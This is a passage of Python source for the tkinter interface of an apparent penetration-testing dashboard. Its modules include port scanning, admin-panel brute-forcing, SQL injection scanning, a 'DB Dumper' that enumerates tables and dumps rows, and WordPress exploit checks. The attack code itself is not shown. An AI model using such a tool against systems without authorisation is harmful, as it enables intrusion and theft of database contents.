        # --- Fixed footer (legal disclaimer) — packed BEFORE the scrollable
        # area so it stays pinned to the bottom of the sidebar. ---
        tk.Label(
            sidebar,
            text="⚠ Authorized testing only.\nScanning systems without\n"
                 "permission is illegal.",
            bg=THEME["bg_alt"], fg=THEME["orange"], font=FONT_MONO_S,
            justify="left").pack(side="bottom", padx=16, pady=14, anchor="w")

        # --- Scrollable module list: Canvas + Scrollbar + inner Frame ---
        # The module buttons live in `nav` (a frame embedded in a canvas) so
        # the list can scroll up/down when it exceeds the window height.
        nav_wrap = tk.Frame(sidebar, bg=THEME["bg_alt"])
        nav_wrap.pack(fill="both", expand=True)

        nav_canvas = tk.Canvas(nav_wrap, bg=THEME["bg_alt"], bd=0,
                               highlightthickness=0)
        nav_scroll = tk.Scrollbar(nav_wrap, orient="vertical",
                                  command=nav_canvas.yview)
        nav_canvas.configure(yscrollcommand=nav_scroll.set)
        nav_scroll.pack(side="right", fill="y")
        nav_canvas.pack(side="left", fill="both", expand=True)

        nav = tk.Frame(nav_canvas, bg=THEME["bg_alt"])
        nav_window = nav_canvas.create_window((0, 0), window=nav, anchor="nw")

        # Keep the scroll region in sync with the inner frame's content.
        nav.bind("<Configure>",
                 lambda _e: nav_canvas.configure(
                     scrollregion=nav_canvas.bbox("all")))
        # Stretch the inner frame to the canvas width.
        nav_canvas.bind("<Configure>",
                        lambda e: nav_canvas.itemconfigure(nav_window,
                                                           width=e.width))

        # Mouse-wheel scrolling: <MouseWheel> on Windows/macOS,
        # <Button-4>/<Button-5> on Linux. Bound on hover so it only applies
        # while the pointer is over the sidebar.
        def _nav_wheel(event):
            if getattr(event, "num", None) == 4:        # Linux scroll up
                nav_canvas.yview_scroll(-1, "units")
            elif getattr(event, "num", None) == 5:      # Linux scroll down
                nav_canvas.yview_scroll(1, "units")
            elif event.delta:                           # Windows / macOS
                nav_canvas.yview_scroll(
                    int(-event.delta / 120) or (-1 if event.delta > 0 else 1),
                    "units")

        def _nav_bind(_e):
            for seq in ("<MouseWheel>", "<Button-4>", "<Button-5>"):
                self.bind_all(seq, _nav_wheel)

        def _nav_unbind(_e):
            for seq in ("<MouseWheel>", "<Button-4>", "<Button-5>"):
                self.unbind_all(seq)

        sidebar.bind("<Enter>", _nav_bind)
        sidebar.bind("<Leave>", _nav_unbind)

        tk.Label(nav, text="MODULES", bg=THEME["bg_alt"],
                 fg=THEME["fg_dim"], font=("Segoe UI", 8, "bold")).pack(
            padx=16, anchor="w")

        self.nav_buttons = {}
        modules = [
            ("ports",     "🔌  Port Scanner"),
            ("dns",       "🌐  DNS & IP Recon"),
            ("subdomain", "🧬  Subdomain Finder"),
            ("admin",     "🔑  Admin Panel Finder"),
            ("tech",      "🧩  Tech / CMS Detector"),
            ("waf",       "🛡  WAF & Payment"),
            ("vuln",      "💥  Vuln Checker"),
            ("sqli",      "💉  SQLi Scanner"),
            ("dbdump",    "🗄  SQLi DB Dumper"),
            ("dbexplore", "🔎  SQLi DB Explorer"),
            ("wpscan",    "🧱  WP Plugins/Themes"),
            ("wpexploit", "⚔️  WP Exploit Check"),
        ]
        for key, label in modules:
            b = tk.Button(
                nav, text=label, anchor="w",
                bg=THEME["bg_alt"], fg=THEME["fg"],
                activebackground=THEME["border"], activeforeground="#ffffff",
                font=FONT_UI, bd=0, relief="flat", padx=16, pady=10,
                cursor="hand2",
                command=lambda k=key: self._select_module(k))
            b.pack(fill="x", padx=8, pady=1)
            self.nav_buttons[key] = b

        tk.Frame(nav, bg=THEME["border"], height=1).pack(
            fill="x", padx=14, pady=14)

        # Utility buttons
        for text, cmd, color in [
            ("💾  Export console log", self._export_log, THEME["fg"]),
            ("🧹  Clear console", self._clear_console, THEME["fg"]),
            ("⛔  Stop active scan", self._stop_scan, THEME["red"]),
        ]:
            tk.Button(nav, text=text, anchor="w", command=cmd,
                      bg=THEME["bg_alt"], fg=color,
                      activebackground=THEME["border"], activeforeground="#fff",
                      font=FONT_UI, bd=0, relief="flat", padx=16, pady=8,
                      cursor="hand2").pack(fill="x", padx=8, pady=1)

        # ======================= MAIN AREA =======================
        main = tk.Frame(self, bg=THEME["bg"])
        main.pack(side="right", fill="both", expand=True)

        # --- Header: module title + description ---
        header = tk.Frame(main, bg=THEME["bg"])
        header.pack(fill="x", padx=18, pady=(16, 6))
        self.lbl_title = tk.Label(header, text="", bg=THEME["bg"],
                                  fg="#ffffff", font=FONT_TITLE)
        self.lbl_title.pack(anchor="w")
        self.lbl_desc = tk.Label(header, text="", bg=THEME["bg"],
                                 fg=THEME["fg_dim"], font=FONT_UI,
                                 wraplength=880, justify="left")
        self.lbl_desc.pack(anchor="w", pady=(2, 0))

        # --- Target input bar ---
        bar = tk.Frame(main, bg=THEME["bg_alt"],
                       highlightbackground=THEME["border"], highlightthickness=1)
        bar.pack(fill="x", padx=18, pady=8)

        tk.Label(bar, text="TARGET", bg=THEME["bg_alt"], fg=THEME["fg_dim"],
                 font=("Segoe UI", 8, "bold")).grid(
            row=0, column=0, padx=(12, 6), pady=10, sticky="w")

        self.var_target = tk.StringVar()
        self.ent_target = tk.Entry(
            bar, textvariable=self.var_target, bg=THEME["bg_input"],
            fg=THEME["green"], insertbackground=THEME["green"],
            font=("Consolas", 11), bd=0, relief="flat")
        self.ent_target.grid(row=0, column=1, padx=4, pady=10, sticky="ew")
        self.ent_target.bind("<Return>", lambda _e: self._start_scan())

        tk.Label(bar, text="PORTS", bg=THEME["bg_alt"], fg=THEME["fg_dim"],
                 font=("Segoe UI", 8, "bold")).grid(row=0, column=2, padx=(10, 4))
        self.var_ports = tk.StringVar(value="top")
        self.cmb_ports = ttk.Combobox(
            bar, textvariable=self.var_ports, width=14, font=FONT_MONO,
            values=["top", "1-1024", "1-65535", "22,80,443,3306,8080",
                    "80,443,8000-9000"])
        self.cmb_ports.grid(row=0, column=3, padx=4, pady=10)

        self.btn_run = tk.Button(
            bar, text="▶  RUN SCAN", command=self._start_scan,
            bg=THEME["accent"], fg="#0d1117", activebackground="#79b8ff",
            activeforeground="#0d1117", font=("Segoe UI", 10, "bold"),
            bd=0, relief="flat", padx=18, pady=6, cursor="hand2")
        self.btn_run.grid(row=0, column=4, padx=(10, 12), pady=8)

        bar.columnconfigure(1, weight=1)

        # --- Console output ---
        console_frame = tk.Frame(main, bg=THEME["border"])
        console_frame.pack(fill="both", expand=True, padx=18, pady=(4, 8))

        self.console = tk.Text(
            console_frame, bg=THEME["bg_input"], fg=THEME["fg"],
            insertbackground=THEME["fg"], font=FONT_MONO, bd=0,
            relief="flat", wrap="word", state="disabled",
            padx=10, pady=8, spacing1=1)
        scroll = tk.Scrollbar(console_frame, command=self.console.yview,
                              bg=THEME["bg_alt"], troughcolor=THEME["bg_input"],
                              bd=0, relief="flat")
        self.console.configure(yscrollcommand=scroll.set)
        scroll.pack(side="right", fill="y")
        self.console.pack(side="left", fill="both", expand=True, padx=1, pady=1)

        # Color tags for log levels.
        self.console.tag_configure("info",  foreground=THEME["accent"])
        self.console.tag_configure("ok",    foreground=THEME["green"])
        self.console.tag_configure("warn",  foreground=THEME["orange"])
        self.console.tag_configure("err",   foreground=THEME["red"])
        self.console.tag_configure("crit",  foreground="#ff7b72",
                                   font=("Consolas", 10, "bold"))
        self.console.tag_configure("dim",   foreground=THEME["fg_dim"])
        self.console.tag_configure("ts",    foreground="#484f58")
        self.console.tag_configure("plain", foreground=THEME["fg"])

        # --- Status bar ---
        status = tk.Frame(main, bg=THEME["bg_alt"],
                          highlightbackground=THEME["border"],
                          highlightthickness=1)
        status.pack(fill="x", padx=18, pady=(0, 14))
        self.var_status = tk.StringVar(value="IDLE")
        self.lbl_status_dot = tk.Label(status, text="●", bg=THEME["bg_alt"],
                                       fg=THEME["green"], font=FONT_UI)
        self.lbl_status_dot.pack(side="left", padx=(10, 4), pady=4)
        tk.Label(status, textvariable=self.var_status, bg=THEME["bg_alt"],
                 fg=THEME["fg"], font=FONT_MONO_S).pack(side="left")
        self.var_tools = tk.StringVar(value=self._tool_summary())
        tk.Label(status, textvariable=self.var_tools, bg=THEME["bg_alt"],
                 fg=THEME["fg_dim"], font=FONT_MONO_S).pack(side="right", padx=10)

        # Module metadata (title / description / placeholder / port field?)
        self._module_meta = {
            "ports": ("Port Scanner",
                      "Discovers open TCP ports and service versions. Uses Nmap "
                      "(-sV) when installed; otherwise falls back to a fast "
                      "native socket scanner.",
                      "example.com  or  192.168.1.1", True),
            "dns": ("DNS & IP Recon",
                    "Domain→IP and IP→Domain mapping, plus NS / MX / TXT / "
                    "CNAME / SOA record enumeration via a built-in DNS resolver.",
                    "example.com  or  8.8.8.8", False),
            "tech": ("Technology & CMS Detector",
                     "Fingerprints the web platform: CMS (WordPress, Joomla, "
                     "Drupal, Shopify…), frameworks, JS libraries and server tech.",
                     "https://example.com", False),
            "waf": ("WAF & Payment Gateway Detector",
                    "Detects Web Application Firewalls (Cloudflare, Akamai, "
                    "Sucuri, ModSecurity…) and embedded payment gateways "
                    "(Stripe, PayPal, Square…).",
                    "https://example.com", False),
            "vuln": ("Vulnerability & Exploit Checker",
                     "Lightweight Nuclei-style engine: probes for exposed "
                     ".env/.git, debug pages, missing security headers, known "
                     "CVE signatures and common misconfigurations.",
                     "https://example.com", False),
            "sqli": ("SQL Injection Scanner",
                     "Comprehensive SQLi detection with a large payload library "
                     "(error-based, boolean, time-based, UNION, auth-bypass). "
                     "Supply a URL with GET parameters; each parameter is probed "
                     "and responses checked for DB error signatures.",
                     "http://site.com/page.php?id=1", False),
            "dbdump": ("SQLi DB Dumper",
                       "AUTHORIZED ONLY. Against a confirmed injectable GET "
                       "parameter: fingerprints the DBMS, extracts version()/"
                       "current_user/database(), and enumerates tables via "
                       "UNION-based injection.",
                       "http://site.com/page.php?id=1", False),
            "dbexplore": ("SQLi DB Explorer",
                          "AUTHORIZED ONLY. Guided enumeration: lists databases "
                          "and tables; append '#tablename' to the target URL to "
                          "enumerate that table's columns and dump sample rows.",
                          "http://site.com/page.php?id=1#users", False),
            "subdomain": ("Subdomain Finder",
                          "Enumerates subdomains for a base domain using a "
                          "built-in wordlist and resolves each live subdomain "
                          "to its IP address(es) via parallel DNS lookups.",
                          "example.com", False),
            "admin": ("Admin Panel Finder",
                      "Brute-forces common admin / login / control-panel URL "
                      "paths and reports pages that exist, redirect to a login, "
                      "or demand authentication.",
                      "https://example.com", False),
            "wpscan": ("WordPress Plugins & Themes Scanner",
                       "Detects WordPress, then enumerates installed plugins "
                       "and themes (passive HTML scrape + active probing of "
                       "readme.txt / style.css) and extracts version numbers.",
                       "https://wpsite.com", False),
            "wpexploit": ("WordPress Exploit Checker",
                          "Fingerprints the WP core version, enumerates "
                          "plugins/themes, matches them against known-vulnerable "
                          "version signatures, and checks common WP "
                          "misconfigurations (xmlrpc, user-enum, exposed "
                          "wp-config backups, debug.log, .git).",
                          "https://wpsite.com", False),
        }
        self._current_module = "ports"
        self._select_module("ports")

    # ------------------------------------------------------------- helpers --

    def _tool_summary(self):
        nmap = which("nmap")
        return f"nmap: {'✓ ' + nmap if nmap else '✗ not found (native fallback)'}"

    def _select_module(self, key):
        self._current_module = key
        title, desc, placeholder, show_ports = self._module_meta[key]
        self.lbl_title.config(text=title)
        self.lbl_desc.config(text=desc)
        # Highlight active nav button.
        for k, b in self.nav_buttons.items():
            b.config(bg=THEME["border"] if k == key else THEME["bg_alt"],
                     fg="#ffffff" if k == key else THEME["fg"])
        # Show/hide the ports field (only relevant to the port scanner).
        if show_ports:
            self.cmb_ports.grid()
        else:
            self.cmb_ports.grid_remove()
        # Placeholder text.
        if not self.var_target.get().strip():
            self.var_target.set(placeholder)
            self.ent_target.config(fg=THEME["fg_dim"])
            self.ent_target.bind("<FocusIn>", self._clear_placeholder, add="+")
        self._log(f"[*] Module selected: {title}", "info")

    def _clear_placeholder(self, _event=None):
        meta = self._module_meta[self._current_module]
        if self.var_target.get() == meta[2]:
            self.var_target.set("")
            self.ent_target.config(fg=THEME["green"])

    def _print_banner(self):
        banner = r"""
  ___  _         ____  _      ___   __
 | _ \| |_  _ _|__ / || | __ | __| \ \ /  ___
 |  _/| ' \| '_| |_ \_  |/ / | _|   \ V // -_)
 |_|  |_||_|_| |___/ |_||_\_\ |___|   |_| \___|
"""
        self._log(banner, "accent" if False else "info")
        self._log(f"  {APP_NAME} v{APP_VERSION} — authorized testing only.",
                  "dim")
        self._log("  Select a module on the left, enter a target, press RUN.",
                  "dim")
        self._log("─" * 78, "dim")

    # --------------------------------------------------------- console I/O --

    def _log(self, text, tag="plain"):
        """Thread-safe log: enqueue a line for the GUI thread to render."""
        self._queue.put(("log", text, tag))

    def _poll_queue(self):
        """Main-thread pump: drains the queue into the console widget."""
        try:
            while True:
                item = self._queue.get_nowait()
                kind = item[0]
                if kind == "log":
                    _, text, tag = item
                    self.console.configure(state="normal")
                    for line in text.split("\n"):
                        ts = datetime.now().strftime("%H:%M:%S")
                        self.console.insert("end", f"[{ts}] ", "ts")
                        self.console.insert("end", line + "\n", tag)
                    self.console.see("end")
                    self.console.configure(state="disabled")
                elif kind == "status":
                    _, text, busy = item
                    self.var_status.set(text)
                    self.lbl_status_dot.config(
                        fg=THEME["orange"] if busy else THEME["green"])
                elif kind == "done":
                    self._on_worker_done(item[1])
        except queue.Empty:
            pass
        self.after(50, self._poll_queue)

    def _clear_console(self):
        self.console.configure(state="normal")
        self.console.delete("1.0", "end")
        self.console.configure(state="disabled")

    def _export_log(self):
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile=f"scan_{datetime.now():%Y%m%d_%H%M%S}.txt",
            title="Export console log")
        if not path:
            return
        try:
            content = self.console.get("1.0", "end-1c")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(content)
            self._log(f"[✓] Console log exported to: {path}", "ok")
        except OSError as e:
            self._log(f"[!] Export failed: {e}", "err")

    # -------------------------------------------------------- scan control --

    def _start_scan(self):
        target = self.var_target.get().strip()
        meta = self._module_meta[self._current_module]
        if not target or target == meta[2]:
            messagebox.showwarning("No target",
                                   "Please enter a target domain, IP or URL.")
            return

        with self._active_lock:
            if self._active_threads > 0:
                if not messagebox.askyesno(
                        "Scan in progress",
                        "A scan is already running. Start another one anyway?"):
                    return

        module = self._current_module
        ports = self.var_ports.get()
        self._log("═" * 78, "dim")
        self._log(f"[▶] Starting '{meta[0]}' against: {target}", "info")
        self._queue.put(("status", f"RUNNING — {meta[0]} → {target}", True))
        self._scan_start = time.time()

        with self._active_lock:
            self._active_threads += 1

        # Dispatch table: module key -> worker function.
        workers = {
            "ports": lambda: run_port_scan(target, ports, self._log,
                                           self._worker_finished),
            "dns":   lambda: run_dns_recon(target, self._log,
                                           self._worker_finished),
            "tech":  lambda: run_tech_detect(target, self._log,
                                             self._worker_finished),
            "waf":   lambda: run_waf_payment(target, self._log,
                                             self._worker_finished),
            "vuln":  lambda: run_vuln_check(target, self._log,
                                            self._worker_finished),
            "sqli":  lambda: run_sqli_scan(target, self._log,
                                           self._worker_finished),
            "dbdump": lambda: run_db_dumper(target, self._log,
                                            self._worker_finished),
            "dbexplore": lambda: run_db_explorer(target, self._log,
                                                 self._worker_finished),
            "subdomain": lambda: run_subdomain_scan(target, self._log,
                                                    self._worker_finished),
            "admin": lambda: run_admin_finder(target, self._log,
                                              self._worker_finished),
            "wpscan": lambda: run_wp_scan(target, self._log,
                                          self._worker_finished),
            "wpexploit": lambda: run_wp_exploit(target, self._log,
                                                self._worker_finished),
        }
        t = threading.Thread(target=self._safe_worker, args=(workers[module],),
                             daemon=True)
        t.start()

    def _safe_worker(self, fn):
        """Wrap module execution so an unexpected crash never kills the GUI."""
        try:
            fn()
        except Exception as e:  # noqa: BLE001
            self._log(f"[!] Unexpected module error: {type(e).__name__}: {e}",
                      "err")
            self._worker_finished(False)

    def _worker_finished(self, success):
        """Called from worker threads; forwards completion to the GUI thread."""
        self._queue.put(("done", bool(success)))

    def _on_worker_done(self, success):
        with self._active_lock:
            self._active_threads = max(0, self._active_threads - 1)
            remaining = self._active_threads
        dt = time.time() - self._scan_start if self._scan_start else 0
        state = "finished" if success else "finished with errors"
        self._log(f"[■] Scan {state} in {dt:.1f}s.", "ok" if success else "warn")
        if remaining == 0:
            self._queue.put(("status", "IDLE", False))

    def _stop_scan(self):
        """
        Python cannot safely kill threads; we signal intent and let the
        current network operation time out. Sockets/requests in this app all
        use short timeouts, so scans wind down quickly.
        """
        with self._active_lock:
            active = self._active_threads
        if active:
            self._log("[!] Stop requested — active scan(s) will terminate at "
                      "the next network timeout (threads cannot be hard-killed "
                      "safely in Python).", "warn")
        else:
            self._log("[i] No scan is currently running.", "dim")


# ==============================================================================
#  ENTRY POINT
# ==============================================================================

def main():
    # High-DPI awareness on Windows (best effort, ignore failures).
    if sys.platform.startswith("win"):
        try:
            import ctypes
            ctypes.windll.shcore.SetProcessDpiAwareness(1)
        except Exception:
            pass
    app = PentestDashboard()
    app.mainloop()


if __name__ == "__main__":
    main()
